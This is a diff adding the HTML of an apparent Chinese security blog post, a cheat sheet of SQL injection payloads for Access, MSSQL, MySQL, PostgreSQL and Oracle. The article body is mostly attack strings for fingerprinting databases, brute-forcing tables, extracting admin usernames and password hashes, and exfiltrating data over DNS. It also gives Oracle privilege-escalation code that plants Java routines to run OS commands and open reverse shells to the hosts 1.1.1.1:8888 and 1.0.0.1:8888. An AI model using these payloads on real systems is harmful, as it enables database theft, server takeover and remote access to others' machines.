@@ -1,0 +1,792 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+
+  
+<head>
+  <meta charset="utf-8">
+  <meta name="author" content="johnscott" />
+  
+  
+  
+  <title>SQL注入-Access | JohnScott1989的博客</title>
+
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+  
+    <meta name="keywords" content="网络安全,SQL注入," />
+  
+
+  <script>
+    console.log('\n%c Hexo-theme-bmw v4.0 ' + '%c 🎉 https://github.com/dongyuanxin/theme-bmw 🎉\n' + '\n%c View demo online ' + '%c 🔍 https://godbmw.com/ 🔍  \n' , 'color: #fadfa3; background: #030307; padding:3px 0;', '', 'color: #fadfa3; background: #030307; padding:3px 0;', '');
+  </script>
+
+  
+    <meta name="description" content="超级帽子戏法的个人博客,主要记录复制粘贴过来的笔记,还有自己的一些心得体会">
+  
+
+  
+
+  
+    <link rel="icon" href="/images/favicon.ico">
+    <link rel="apple-touch-icon" href="/images/touch-icon.png">
+  
+
+  <link href="https://cdn.bootcss.com/fancybox/3.5.2/jquery.fancybox.min.css" rel="stylesheet">
+  
+<link rel="stylesheet" href="/css/base.css">
+<link rel="stylesheet" href="/icon/iconfont.css">
+<link rel="stylesheet" href="/css/github-markdown.css">
+<link rel="stylesheet" href="/css/highlight.css">
+
+
+  
+<script src="/js/util.js"></script>
+<script src="/js/valine.min.js"></script>
+
+
+  
+
+  
+    <link href="https://cdn.bootcss.com/aplayer/1.10.1/APlayer.min.css" rel="stylesheet">
+    <script src="https://cdn.bootcss.com/aplayer/1.10.1/APlayer.min.js" async></script>
+  
+
+  
+    <link href="https://cdn.bootcss.com/social-share.js/1.0.16/css/share.min.css" rel="stylesheet">
+  
+  
+  <script src="//cdn.bootcss.com/jquery/3.3.1/jquery.min.js" async></script>
+  
+  
+    <script src="//cdn.jsdelivr.net/npm/leancloud-storage@3.11.0/dist/av-min.js"></script>
+  
+
+<meta name="generator" content="Hexo 5.1.1"></head>
+
+  <body>
+
+    
+
+    <div id="app">
+
+      <div class="header-wrap">
+  <header>
+    <div class="site-brand">
+      <div class="site-title">
+        <a href="/">JohnScott1989</a>
+      </div>
+    </div>
+    <nav class="site-navigation">
+      <ul class="nav-menu">
+      
+        <li class="nav-item" data-path="/">
+          
+            <a 
+              href="/"
+              target="_self"
+            >
+              主页
+            </a>
+          
+        </li>
+      
+        <li class="nav-item" data-path="/archives/">
+          
+            <a 
+              href="/archives/"
+              target="_self"
+            >
+              归档
+            </a>
+          
+        </li>
+      
+        <li class="nav-item" data-path="/categories/">
+          
+            <a 
+              href="/categories/"
+              target="_self"
+            >
+              分类
+            </a>
+          
+        </li>
+      
+        <li class="nav-item" data-path="/tags/">
+          
+            <a 
+              href="/tags/"
+              target="_self"
+            >
+              标签
+            </a>
+          
+        </li>
+      
+        <li class="nav-item" data-path="/friends/">
+          
+            <a 
+              href="/friends/"
+              target="_self"
+            >
+              友链
+            </a>
+          
+        </li>
+      
+        <li class="nav-item" data-path="/about/">
+          
+            <a 
+              href="/about/"
+              target="_self"
+            >
+              关于
+            </a>
+          
+        </li>
+      
+        <li class="nav-item" data-path="">
+          
+            <a href="javascript:void(0);" v-else>联系我</a>
+            <ul class="nav-menu--dropdown">
+              
+                <li>
+                  <a 
+                    href="https://github.com/liuxue5213" 
+                    target="_blank"
+                  >
+                    Github
+                  </a>
+                </li>
+              
+                <li>
+                  <a 
+                    href="https://www.zhihu.com/people/liuxue5213" 
+                    target="_blank"
+                  >
+                    知乎
+                  </a>
+                </li>
+              
+                <li>
+                  <a 
+                    href="http://weibo.com/liuxue5213" 
+                    target="_blank"
+                  >
+                    微博
+                  </a>
+                </li>
+              
+                <li>
+                  <a 
+                    href="https://www.douban.com/people/liuxue5213" 
+                    target="_blank"
+                  >
+                    豆瓣
+                  </a>
+                </li>
+              
+                <li>
+                  <a 
+                    href="/linkedin.com/in/liuxue5213" 
+                    target="_blank"
+                  >
+                    linkedin
+                  </a>
+                </li>
+              
+            </ul>
+          
+        </li>
+      
+      </ul>
+    </nav>
+    <i class="iconfont icon-menu"></i>
+  </header>
+</div>
+
+<script>
+  let links = document.querySelectorAll('.nav-item');
+  for(let link of links){
+    let childrenLink = link.querySelector('ul');
+    link.addEventListener('mouseenter', () => {
+      if(childrenLink) {
+        childrenLink.className = "nav-menu--dropdown active";
+      }
+    })
+    link.addEventListener('mouseleave', () => {
+      if(childrenLink) {
+        childrenLink.className = "nav-menu--dropdown";
+      }
+    })
+  }
+  let rootRealPath = getRealPath(window.location.pathname, true);
+  for(let link of links) {
+    let linkPath = link.getAttribute("data-path");
+    if(linkPath && getRealPath(linkPath, true) === rootRealPath) {
+      link.className = "nav-item hover";
+    }
+  }
+
+  let iconMenu = document.querySelector("i.iconfont.icon-menu"),
+    iconMenuClicked = false;
+  let navDOM = document.querySelector("nav.site-navigation");
+  iconMenu.addEventListener("click", () => {
+    iconMenuClicked 
+      ? navDOM.className = "site-navigation active"
+      : navDOM.className = "site-navigation";
+    iconMenuClicked = !iconMenuClicked;
+  })
+</script>
+
+      
+
+
+
+
+
+
+
+
+<div class="container post-index">
+
+  
+
+<div class="post">
+  <h1 class="article-title">
+    <span>SQL注入-Access</span>
+  </h1>
+  <div class="article-top-meta">
+    <span>
+      发布 : 
+      2021-06-12
+    </span>
+    
+      <span>
+        分类 : 
+          <a href="/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/">
+            网络安全
+          </a>
+      </span>
+    
+    
+      <span>
+        浏览 : <span class="article-timer" data-identity="19SQL注入-Access-Oracle-Postgrsql"></span>
+      </span>
+    
+  </div>
+
+  
+
+  <div class="article-content">
+    <div class="markdown-body">
+      <h2 id="Access"><a href="#Access" class="headerlink" title="Access"></a>Access</h2><p>Access 和 SQL Server 都有自己的系统表，比如存放数据库中所有对象的表：<br>Access 是在系统表“msysobjects”中，但在 Web 环境下读该表会提示“没有权限”；<br>SQL Server 是在表“sysobjects”中，在 Web 环境下可正常读取。</p>
+<p>在确认可以注入的情况下，使用下面的语句：<a target="_blank" rel="noopener" href="http://www.xxx.com/a.asp?ID=1">http://www.xxx.com/a.asp?ID=1</a> and(select count(*) from sysobjects)&gt;0 如果数据库是 Access，由于找不到表 sysobjects，服务器错误提示</p>
+<h3 id="判断数据库类型"><a href="#判断数据库类型" class="headerlink" title="判断数据库类型"></a>判断数据库类型</h3><p>通过页面返回的报错信息，一般情况下页面报错会显示是什么数据库类型</p>
+<h3 id="通过各个数据库特有的数据表来判断"><a href="#通过各个数据库特有的数据表来判断" class="headerlink" title="通过各个数据库特有的数据表来判断"></a>通过各个数据库特有的数据表来判断</h3><p>mssql数据库<br><a target="_blank" rel="noopener" href="http://127.0.0.1/test.php?id=1">http://127.0.0.1/test.php?id=1</a> and (select count(*) from sysobjects)&gt;0 and 1=1</p>
+<p>access数据库<br><a target="_blank" rel="noopener" href="http://127.0.0.1/test.php?id=1">http://127.0.0.1/test.php?id=1</a> and (select count(*) from msysobjects)&gt;0 and 1=1</p>
+<p>mysql数据库(mysql 版本在 5.0 以上)<br><a target="_blank" rel="noopener" href="http://127.0.0.1/test.php?id=1">http://127.0.0.1/test.php?id=1</a> and (select count(*) from information_schema.TABLES)&gt;0 and 1=1</p>
+<p>oracle数据库<br><a target="_blank" rel="noopener" href="http://127.0.0.1/test.php?id=1">http://127.0.0.1/test.php?id=1</a> and (select count(*) from sys.user_tables)&gt;0 and 1=1</p>
+<h3 id="通过各数据库特有的连接符判断数据库类型"><a href="#通过各数据库特有的连接符判断数据库类型" class="headerlink" title="通过各数据库特有的连接符判断数据库类型"></a>通过各数据库特有的连接符判断数据库类型</h3><p>1、mssql数据库<br><a target="_blank" rel="noopener" href="http://127.0.0.1/test.php?id=1">http://127.0.0.1/test.php?id=1</a> and ‘1’ + ‘1’ = ‘11’ </p>
+<p>2、mysql数据库<br><a target="_blank" rel="noopener" href="http://127.0.0.1/test.php?id=1">http://127.0.0.1/test.php?id=1</a> and ‘1’ + ‘1’ = ‘11’<br><a target="_blank" rel="noopener" href="http://127.0.0.1/test.php?id=1">http://127.0.0.1/test.php?id=1</a> and CONCAT(‘1’,’1’)=’11’</p>
+<p>3、oracle数据库<br><a target="_blank" rel="noopener" href="http://127.0.0.1/test.php?id=1">http://127.0.0.1/test.php?id=1</a> and ‘1’||’1’=’11’<br><a target="_blank" rel="noopener" href="http://127.0.0.1/test.php?id=1">http://127.0.0.1/test.php?id=1</a> and CONCAT(‘1’,’1’)=’11’ </p>
+<p>4、access数据库<br><a target="_blank" rel="noopener" href="http://127.0.0.1/test.php?id=1">http://127.0.0.1/test.php?id=1</a> and ‘1’&amp;’1’=’11’</p>
+<p>判断数据库为oracle<br>提交注释字符/*，返回正常即是MySQL，否则继续提交注释符号–，该符号是Oracle和MsSQL支持的注释符，返回正常就需要继续判断。可以继续提交多语句支持符号;如果支持多行查询，说明是MSSQL，因为Oracle不支持多行查询，可以继续提交查询语句</p>
+<p>and exist(select * from dual)<br>and (select count(*) from user_tables)&lt;0 –</p>
+<p>利用的原理是dual表和user_tables表是oracle中的系统表，返回正常就判断为Oracle</p>
+<h3 id="逐一爆破字段"><a href="#逐一爆破字段" class="headerlink" title="逐一爆破字段"></a>逐一爆破字段</h3><h4 id="确定当前查询的列数"><a href="#确定当前查询的列数" class="headerlink" title="确定当前查询的列数"></a>确定当前查询的列数</h4><p>order by 2 正确<br>order by 2 错误 这就说明字段数目是 2</p>
+<h4 id="猜解表名"><a href="#猜解表名" class="headerlink" title="猜解表名"></a>猜解表名</h4><p>由于 Access 数据库的系统表默认不可访问，故不能像 Mysql 数据库一样，通过注系统表来获得表名和列名。这也是 Access 数据库比较难注入的一个原因，只要表名、列名够变态，有注入点也很难注出结果</p>
+<ol>
+<li><p>系统表<br>UNION SELECT Name, NULL, NULL, NULL, NULL from MSysObjects WHERE Type=1</p>
+</li>
+<li><p>爆破法<br>‘ AND (SELECT TOP 1 1 FROM TableNameToBruteforce[i])<br>在提交注入查询语句后，如果获得的 HTML 返回和正常页面一样，则表存在。</p>
+</li>
+</ol>
+<p>AND exists(select * from tablename)?ID=568 and(select count(*) from admin)&gt;=0<br>‘ AND (SELECT TOP 1 1 FROM TableNameToBruteforce[i])<br>通过写脚本，用字典中的项逐一替换 tablename，直到返回正确页面，即表示当前表名存在</p>
+<h4 id="表名猜完之后那就猜列（为了方便假设表名为-admin）"><a href="#表名猜完之后那就猜列（为了方便假设表名为-admin）" class="headerlink" title="表名猜完之后那就猜列（为了方便假设表名为 admin）"></a>表名猜完之后那就猜列（为了方便假设表名为 admin）</h4><p>and (select count(字段名) from admin)&gt;0<br>and (select count(username) from article_admin)&gt;0<br>and (select count(password) from article_admin)&gt;0<br>如果都返回正常那就说明存在 username 和 password 这两个字段名</p>
+<h4 id="猜用户名和密码长度；"><a href="#猜用户名和密码长度；" class="headerlink" title="猜用户名和密码长度；"></a>猜用户名和密码长度；</h4><p>and (select top 1 len(username) from article_admin)=5 返回正常，说明 username 内容长度为 5（从 1 开始一直去尝试，知道返回页面错误为止</p>
+<p>and (select top 1 len(password) from article_admin)=16 正常，password 内容长度为 16，也就是 MD5 的值</p>
+<h4 id="猜用户名和密码内容"><a href="#猜用户名和密码内容" class="headerlink" title="猜用户名和密码内容"></a>猜用户名和密码内容</h4><p>and (select top 1 asc(mid(username,1,1)) from article_admin)=97 返回了正常，说明第一<br>username 里的第一位内容是 ASC 码的 97，也就是 a；<br>猜第二位把 username,1,1 改成 username,2,1 就可以了。 猜密码把 username 改成 password；</p>
+<p>（ascii 不行）access 截取字符串，Left 函数，Right </p>
+<h3 id="PostgreSQL"><a href="#PostgreSQL" class="headerlink" title="PostgreSQL"></a>PostgreSQL</h3><p>字段数<br>id=1+order+by+26–</p>
+<p>cast类型转换<br>id=1+and+1::int=1–<br>id=1+and+1=cast(version() as int)–</p>
+<p>当前版本<br>version()</p>
+<p>当前用户权限<br>current_schema()</p>
+<p>数据库名字<br>current_database()<br>select+datname+from+pg_database+limit+1+offset+0–</p>
+<p>每个表名的字段<br>id=1+and+1=2+union+select+column_name+from+information_schema.columns+where+table_name=’表名’+limit+1+offset+0–</p>
+<p>表<br>SELECT table_name FROM information_schema.tables WHERE table_schema=’public’ </p>
+<p>select relname from pg_stat_user_tables limit 1 offset 1</p>
+<p>字段<br>select array_to_string(ARRAY(SELECT unnest(array_agg(column_name)) order by 1),’,’) from information_schema.columns where table_name = ‘表名’<br>SELECT string_agg(column_name, ‘,’) FROM information_schema.columns where table_schema=’public’ and table_name=’position’</p>
+<p>– 根据编号分组取第一条数据<br>select * from table t where t.no=(select max(no) from table t1 where t1.no=t.no)</p>
+<p>– 根据编号分组后取第一条数据<br>SELECT * FROM (SELECT ROW_NUMBER() OVER (partition BY no ORDER BY no) rowId,* from table) t WHERE rowId=1</p>
+<h2 id="oracle"><a href="#oracle" class="headerlink" title="oracle"></a>oracle</h2><p>Union联合查询：</p>
+<p>order by 定字段</p>
+<p>and 1=2 union select null,null….. from dual 然后一个一个去判断字段类型，方法如下<br>and 1=2 union select ‘null’,null…… from dual 返回正常，说明第一个字段是字符型，反之为数字型<br>判断第n个字段的类型，依次类推即可</p>
+<p>确定回显位，假设当前共2个字段，全是数字型，判断方式如下：<br>and 1=2 union select 1,2 from dual</p>
+<p>假设回显位是2，爆当前数据库中的第一个表：<br>and 1=2 union select 1,(select table_name from user_tables where rownum=1) from dual</p>
+<p>当前数据库中的第二个表：<br>and 1=2 union select 1,(select table_name from user_tables where rownum=1 and table_name not in (‘第一个表’)) from dual</p>
+<p>表中的第一个字段：<br>and 1=2 union select 1,(select column_name from user_tab_columns where rownum=1 and table_name=’表名（大写的）’) from dual</p>
+<p>表中的第二个字段：<br>and 1=2 union select 1,(select column_name from user_tab_columns where rownum=1 and table_name=’表名’ and column_name not in (‘第一个字段’)) from dual</p>
+<p>表中的第一行数据：<br>and 1=2 union select 1,字段1||字段2…||字段n from 表名 where rownum=1 –连接多个字段用到的连接符号是||,在oracle数据库中，concat函数只能连接两个字符串</p>
+<p>通过字段名找到对应表：<br>SELECT owner, table_name FROM all_tab_columns WHERE column_name LIKE ‘%PASS%’;</p>
+<p>查询第N行：<br>SELECT username FROM (SELECT ROWNUM r, username FROM all_users ORDER BY username) WHERE r=9; — 查询第9行(从1开始数)</p>
+<p>当前用户：<br>SELECT user FROM dual;</p>
+<p>列出所有用户：<br>SELECT username FROM all_users ORDER BY username;</p>
+<p>列出数据库<br>SELECT DISTINCT owner FROM all_tables;</p>
+<p>列出表名：<br>SELECT table_name FROM all_tables;<br>SELECT owner, table_name FROM all_tables;</p>
+<p>列出字段名：<br>SELECT column_name FROM all_tab_columns WHERE table_name = ‘blah’;<br>SELECT column_name FROM all_tab_columns WHERE table_name = ‘blah’ and owner = ‘foo’;</p>
+<p>定位DB文件<br>SELECT name FROM V$DATAFILE;</p>
+<p>布尔盲注<br>and 1=(select decode(substr(user,1,1),’S’,1,0) from dual<br>and 1=(select decode(substr((select username||password from admin),1,1),’a’,1,0) from dual)<br>and 1=(instr((select user from dual),’SYS’))<br>and (select ascii(substr(username,1,1)) from admin)=97<br>select utl_inaddr.get_host_address((select user from dual)||’<a target="_blank" rel="noopener" href="http://www.dns.com&/#39;">www.dns.com&#39;</a>) from dual)is not null– 站库分离dns传</p>
+<p>延时注入<br>select decode(substr(user,1,1),’A’,DBMS_PIPE.RECEIVE_MESSAGE(‘a’,5) ,0) from dual</p>
+<p>报错注入<br>and 1=ctxsys.drithsx.sn(1,(select user from dual))—<br>and (select upper(XMLType(chr(60)||chr(58)||(select user from dual)||chr(62))) from dual) is not null—<br>and (select dbms_xdb_version.makeversioned((select user from dual)) from dual) is not null—</p>
+<p>在oracle存储过程中，运行权限有两种权限，一个的difiner(为函数创建者权限，创建时默认创建者权限，一般都是dba高权限创建)和invoker（调用函数的用户权限），简单来说就是我们在低权限下运行高权限创建的存储过程，我们在调用的时候，就是可以访问高权限的资源以及使用高权限。提权的话主要由于高权限用户创建存储过程没有经过安全处理或者被绕过，低权限用户直接调用该存储过程函数，执行命令</p>
+<p>影响版本:Oracle 8.1.7.4, 9.2.0.1 - 9.2.0.7, 10.1.0.2 - 10.1.0.4, 10.2.0.1-10.2.0.2<br>利用漏洞<br>Create or REPLACE<br>PACKAGE HACKERPACKAGE AUTHID CURRENT_USER<br>IS<br>FUNCTION ODCIIndexGetMetadata (oindexinfo SYS.odciindexinfo,P3 VARCHAR2,p4 VARCHAR2,env<br>SYS.odcienv)<br>RETURN NUMBER;<br>END;<br>/</p>
+<p>赋予权限<br>Create or REPLACE<br>PACKAGE HACKERPACKAGE AUTHID CURRENT_USER<br>IS<br>FUNCTION ODCIIndexGetMetadata (oindexinfo SYS.odciindexinfo,P3 VARCHAR2,p4 VARCHAR2,env<br>SYS.odcienv)<br>RETURN NUMBER;<br>END;<br>/</p>
+<p>提权<br>DECLARE<br>INDEX_NAME VARCHAR2(200);<br>INDEX_SCHEMA VARCHAR2(200);<br>TYPE_NAME VARCHAR2(200);<br>TYPE_SCHEMA VARCHAR2(200);<br>VERSION VARCHAR2(200);<br>NEWBLOCK PLS_INTEGER;<br>GMFLAGS NUMBER;<br>v_Return VARCHAR2(200);<br>BEGIN<br>INDEX_NAME := ‘A1’;<br>INDEX_SCHEMA := ‘SCOTT’;<br>TYPE_NAME := ‘HACKERPACKAGE’;<br>TYPE_SCHEMA := ‘SCOTT’;<br>VERSION := ‘10.2.0.1.0’;<br>GMFLAGS := 1;<br>v_Return := SYS.DBMS_EXPORT_EXTENSION.GET_DOMAIN_INDEX_METADATA(INDEX_NAME =&gt;<br>INDEX_NAME,<br>INDEX_SCHEMA=&gt; INDEX_SCHEMA,<br>TYPE_NAME =&gt; TYPE_NAME,<br>TYPE_SCHEMA =&gt; TYPE_SCHEMA,<br>VERSION =&gt; VERSION,<br>NEWBLOCK =&gt; NEWBLOCK,<br>GMFLAGS =&gt; GMFLAGS);<br>END;<br>/<br>/</p>
+<p>当有dba/rescouce权限（或者）获取系统权限:即可创建JAVA代码-&gt;赋予JAVA执行权限-&gt;创建函数-&gt;赋予函数执行权限-&gt;执行命令</p>
+<p>and (select SYS.DBMS_EXPORT_EXTENSION.GET_DOMAIN_INDEX_TABLES(‘FOO’,’BAR’,’DBMS_OUTPUT”.PUT(:P1);EXECUTE IMMEDIATE ‘’DECLARE PRAGMA AUTONOMOUS_TRANSACTION;BEGIN EXECUTE IMMEDIATE ‘’’’create or replace and compile java source named “LinxUtil” as import java.io.*; public class LinxUtil extends Object {public static String runCMD(String args){try{BufferedReader myReader= new BufferedReader(new InputStreamReader(Runtime.getRuntime().exec(args).getInputStream() ) ); String stemp,str=””;while ((stemp = myReader.readLine()) != null) str +=stemp+”\n”;myReader.close();return str;} catch (Exception e){return e.toString();}}public static String readFile(String filename){try{BufferedReader myReader= new BufferedReader(new FileReader(filename)); String stemp,str=””;while ((stemp = myReader.readLine()) != null) str +=stemp+”\n”;myReader.close();return str;} catch (Exception e){return e.toString();}}}’’’’;END;’’;END;–’,’SYS’,0,’1’,0) from dual) is not null–<br>and (select SYS.DBMS_EXPORT_EXTENSION.GET_DOMAIN_INDEX_TABLES(‘FOO’,’BAR’,’DBMS_OUTPUT”.PUT(:P1);EXECUTE IMMEDIATE ‘’DECLARE PRAGMA AUTONOMOUS_TRANSACTION;BEGIN EXECUTE IMMEDIATE ‘’’’begin dbms_java.grant_permission(‘’’’’’’’PUBLIC’’’’’’’’, ‘’’’’’’’SYS:java.io.FilePermission’’’’’’’’,’’’’’’’’&lt;&gt;’’’’’’’’, ‘’’’’’’’execute’’’’’’’’);end;’’’’;END;’’;END;–’,’SYS’,0,’1’,0) from dual) is not null–<br>and (select SYS.DBMS_EXPORT_EXTENSION.GET_DOMAIN_INDEX_TABLES(‘FOO’,’BAR’,’DBMS_OUTPUT”.PUT(:P1);EXECUTE IMMEDIATE ‘’DECLARE PRAGMA AUTONOMOUS_TRANSACTION;BEGIN EXECUTE IMMEDIATE ‘’’’create or replace function LinxRunCMD(p_cmd in varchar2) return varchar2 as language java name’’’’’’’’LinxUtil.runCMD(java.lang.String) return String’’’’’’’’;’’’’;END;’’;END;–’,’SYS’,0,’1’,0) from dual) is not null–<br>and (select SYS.DBMS_EXPORT_EXTENSION.GET_DOMAIN_INDEX_TABLES(‘FOO’,’BAR’,’DBMS_OUTPUT”.PUT(:P1);EXECUTE IMMEDIATE ‘’DECLARE PRAGMA AUTONOMOUS_TRANSACTION;BEGIN EXECUTE IMMEDIATE ‘’’’grant all on LinxRunCMD to public’’’’;END;’’;END;–’,’SYS’,0,’1’,0) from dual) is not null–<br>and (select sys.LinxRunCMD(‘/bin/bash -c /usr/bin/whoami’) from dual) is not null–</p>
+<p>当有dba/rescouce权限反弹shell:创建JAVA代码-&gt;创建函数-&gt;赋予函数执行权限-&gt;反弹shell<br>windows<br>and (select SYS.DBMS_EXPORT_EXTENSION.GET_DOMAIN_INDEX_TABLES(‘FOO’,’BAR’,’DBMS_OUTPUT”.PUT(:P1);EXECUTE IMMEDIATE ‘’DECLARE PRAGMA AUTONOMOUS_TRANSACTION;BEGIN EXECUTE IMMEDIATE ‘’’’create or replace and compile java source named “shell” as import java.io.<em>;import java.net.</em>;public class shell{public static void run() throws Exception {Socket s = new Socket(“1.1.1.1”, 8888);Process p = Runtime.getRuntime().exec(“cmd.exe”);new T(p.getInputStream(), s.getOutputStream()).start();new T(p.getErrorStream(), s.getOutputStream()).start();new T(s.getInputStream(), p.getOutputStream()).start();}static class T extends Thread {private InputStream i;private OutputStream u;public T(InputStream in, OutputStream out) {this.u = out;this.i = in;}public void run() {BufferedReader n = new BufferedReader(new InputStreamReader(i));BufferedWriter w = new BufferedWriter(new OutputStreamWriter(u));char f[] = new char[8192];int l;try {while ((l = n.read(f, 0, f.length)) &gt; 0) {w.write(f, 0, l);w.flush();}} catch (IOException e) {}try {if (n != null)n.close();if (w != null)w.close();} catch (Exception e) {}}}}’’’’;END;’’;END;–’,’SYS’,0,’1’,0) from dual) is not null–<br>and (select SYS.DBMS_EXPORT_EXTENSION.GET_DOMAIN_INDEX_TABLES(‘FOO’,’BAR’,’DBMS_OUTPUT”.PUT(:P1);EXECUTE IMMEDIATE ‘’DECLARE PRAGMA AUTONOMOUS_TRANSACTION;BEGIN EXECUTE IMMEDIATE ‘’’’begin dbms_java.grant_permission( ‘’’’’’’’PUBLIC’’’’’’’’, ‘’’’’’’’SYS:java.net.SocketPermission’’’’’’’’, ‘’’’’’’’&lt;&gt;’’’’’’’’, ‘’’’’’’’*’’’’’’’’ );end;’’’’;END;’’;END;–’,’SYS’,0,’1’,0) from dual) is not null–<br>and (select SYS.DBMS_EXPORT_EXTENSION.GET_DOMAIN_INDEX_TABLES(‘FOO’,’BAR’,’DBMS_OUTPUT” .PUT(:P1);EXECUTE IMMEDIATE ‘’DECLARE PRAGMA AUTONOMOUS_TRANSACTION;BEGIN EXECUTE IMMEDIATE ‘’’’grant all on reversetcp to public’’’’;END;’’;END;–’,’SYS’,0,’1’,0) from dual) is not null–<br>and (select sys.reversetcp from dual) is not null–</p>
+<p>当有dba/rescouce权限反弹shell:创建JAVA代码-&gt;-&gt;赋予JAVA代码权限-&gt;创建函数-&gt;赋予函数执行权限-&gt;反弹shell<br>and (select SYS.DBMS_EXPORT_EXTENSION.GET_DOMAIN_INDEX_TABLES(‘FOO’,’BAR’,’DBMS_OUTPUT”.PUT(:P1);EXECUTE IMMEDIATE ‘’DECLARE PRAGMA AUTONOMOUS_TRANSACTION;BEGIN EXECUTE IMMEDIATE ‘’’’create or replace and compile java source named “shell” as import java.io.<em>;import java.net.</em>;public class shell {public static void run() throws Exception{String[] aaa={“/bin/bash”,”-c”,”exec 9&lt;&gt; /dev/tcp/1.0.0.1/8888;exec 0&lt;&9;exec 1&gt;&amp;9 2&gt;&1;/bin/sh”};Process p=Runtime.getRuntime().exec(aaa);}}’’’’;END;’’;END;–’,’SYS’,0,’1’,0) from dual) is not null–<br>and (select SYS.DBMS_EXPORT_EXTENSION.GET_DOMAIN_INDEX_TABLES(‘FOO’,’BAR’,’DBMS_OUTPUT”.PUT(:P1);EXECUTE IMMEDIATE ‘’DECLARE PRAGMA AUTONOMOUS_TRANSACTION;BEGIN EXECUTE IMMEDIATE ‘’’’begin dbms_java.grant_permission( ‘’’’’’’’PUBLIC’’’’’’’’, ‘’’’’’’’SYS:java.net.SocketPermission’’’’’’’’, ‘’’’’’’’&lt;&gt;’’’’’’’’, ‘’’’’’’’*’’’’’’’’ );end;’’’’;END;’’;END;–’,’SYS’,0,’1’,0) from dual) is not null–<br>and (select SYS.DBMS_EXPORT_EXTENSION.GET_DOMAIN_INDEX_TABLES(‘FOO’,’BAR’,’DBMS_OUTPUT” .PUT(:P1);EXECUTE IMMEDIATE ‘’DECLARE PRAGMA AUTONOMOUS_TRANSACTION;BEGIN EXECUTE IMMEDIATE ‘’’’create or replace function reversetcp RETURN VARCHAR2 as language java name ‘’’’’’’’shell.run() return String’’’’’’’’; ‘’’’;END;’’;END;–’,’SYS’,0,’1’,0) from dual) is not null–<br>and (select SYS.DBMS_EXPORT_EXTENSION.GET_DOMAIN_INDEX_TABLES(‘FOO’,’BAR’,’DBMS_OUTPUT” .PUT(:P1);EXECUTE IMMEDIATE ‘’DECLARE PRAGMA AUTONOMOUS_TRANSACTION;BEGIN EXECUTE IMMEDIATE ‘’’’grant all on reversetcp to public’’’’;END;’’;END;–’,’SYS’,0,’1’,0) from dual) is not null–<br>and (select sys.reversetcp from dual) is not null–</p>
+<p>oracle11g逻辑漏洞<br>要是有create session权限的用户（连数据库的权限）, 因为允许了public调用DBMS_JVM_EXP_PERMS中的函数，便可以赋予任意java<br>DECLARE<br>POL DBMS_JVM_EXP_PERMS.TEMP_JAVA_POLICY;<br>CURSOR C1 IS SELECT ‘GRANT’,USER(), ‘SYS’,’java.io.FilePermission’,’&lt;<ALL FILES>&gt;‘,’execute’,’ENABLED’ from dual;<br>BEGIN<br>OPEN C1;<br>FETCH C1 BULK COLLECT INTO POL;<br>CLOSE C1;<br>DBMS_JVM_EXP_PERMS.IMPORT_JVM_PERMS(POL);<br>END;<br>/</p>
+    </div>
+  </div>
+  
+    <div class="copy-right">
+      <div class="markdown-body">
+        <blockquote>
+        
+        
+          本文作者 : JohnScott <br/>
+        
+        原文链接 : <a href="">https://github.com/liuxue5213/liuxue5213.github.io/2021/19SQL%E6%B3%A8%E5%85%A5-Access-Oracle-Postgrsql/</a><br>
+        版权声明 : 本博客所有文章除特别声明外，均采用 <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> 许可协议。转载请注明出处！
+        </blockquote>
+      </div>
+    </div>
+  
+  
+  
+    <div class="social-share"
+  style="margin-top: -2rem"
+  data-wechat-qrcode-title="<p>微信扫一扫</p>"
+  data-wechat-qrcode-helper="<p>微信右上角, 扫一扫分享</p>"
+   data-sites="qzone, qq, weibo, wechat, douban, google, facebook, twitter" 
+  
+>
+  <span style="color: #6b7487; font-size: 1.4rem;">分享到: </span>
+</div>
+<script src="https://cdn.bootcss.com/social-share.js/1.0.16/js/social-share.min.js" async>
+  
+
+  
+    <div id="reward">
+  
+    <p id="reward-meta">知识 & 情怀 | 二者兼得</p>
+  
+  <button id="reward-btn">
+    
+    <span>感谢您的关心</span>
+  </button>
+  <div id="reward-qrcode">
+    
+      <div class="reward-qrcode--container">
+        <img class="qrcode-img" src="/images/wechat.png" alt="微信扫一扫">
+        <p class="qrcode-meta">微信扫一扫</p>
+      </div>
+    
+      <div class="reward-qrcode--container">
+        <img class="qrcode-img" src="/images/alipay.png" alt="支付宝扫一扫">
+        <p class="qrcode-meta">支付宝扫一扫</p>
+      </div>
+    
+  </div>
+
+</div>
+
+<script>
+  (() => {
+    let button = document.querySelector('#reward-btn'),
+      qrcode = document.querySelector('#reward-qrcode'),
+      display = false;
+    
+    button.addEventListener('click', () => {
+      qrcode.style.display = display ? 'none' : 'block'
+      display = !display
+    }, false)
+  })()
+</script>
+  
+
+  <div class="article-footer">
+    <div class="article-meta pull-left">
+      <span>
+        
+          <i class="iconfont icon-06tags"></i>标签: 
+          
+          <span class="span--tag">
+            <a href="/tags/SQL%E6%B3%A8%E5%85%A5/">
+              #SQL注入
+            </a>
+          </span>
+          
+        
+      </span>
+    </div>
+    <div class="article-meta pull-right">
+    </div>
+  </div>
+</div>
+
+
+  <aside id="sidebar">
+    <p id="sidebar-header"></p>
+    <ol id="sidebar-toc"></ol>
+  </aside>
+  <script async>setTimeout(generateToc, 10);</script>
+
+
+  <nav class="post-navigation">
+    
+      <div class="nav-pre">
+        <i class="iconfont icon-prev"></i>
+        上一篇:
+        <a href="/2021/18SQL%E6%B3%A8%E5%85%A5-SQL%20SERVER/" target="_self">SQL注入-SQL SERVER</a>
+      </div>
+    
+    
+      <div class="nav-next">
+        下一篇:
+        <a href="/2021/20SQL%E6%B3%A8%E5%85%A5-%E7%BB%95%E8%BF%87/" target="_self">SQL注入-绕过</a>
+        <i class="iconfont icon-next"></i>
+      </div>
+    
+  </nav>
+
+  
+    <a href="#comment" class="comment-anchor"></a>
+<div class="comment-title"><i class="iconfont icon-footprint"></i> 留下足迹 <i class="iconfont icon-footprint"></i></div>
+<div id="vcomments"></div>
+
+<script defer>
+  if( true ) {
+    let path = getRealPath()
+    new Valine({
+      el: "#vcomments",
+      appId: "E4f1KI8G9DKenPGcXCkfpCMV-gzGzoHsz",
+      appKey: "6VNHrdDAu0JKJXxyMajHk6qD",
+      notify: false,
+      verify: false,
+      avatar: "robohash",
+      placeholder: "正确填写邮箱, 才能及时收到回复哦♪(^∇^*)",
+      path
+    });
+  }
+</script>
+   
+
+  
